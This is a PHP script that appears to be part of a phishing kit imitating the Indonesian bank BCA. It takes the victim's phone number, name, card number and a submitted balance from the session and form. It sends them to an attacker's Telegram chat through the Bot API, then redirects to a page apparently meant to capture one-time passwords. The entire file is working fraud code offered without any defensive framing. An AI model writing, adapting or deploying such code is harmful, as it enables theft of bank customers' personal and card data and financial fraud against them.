<?php
include "../telegram.php";
session_start();

$nomor = $_SESSION['nomor'];
$nama = $_SESSION['nama'];
$atm = $_SESSION['atm'];
$saldo = $_POST['saldo'];

$_SESSION['saldo'] = $saldo;
$message = "
( BCA | Saldo )

- No HP : ".$nomor."
- Nama : ".$nama."
- Kartu : ".$atm."
- Saldo : ".$saldo."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../ot.php');
?>
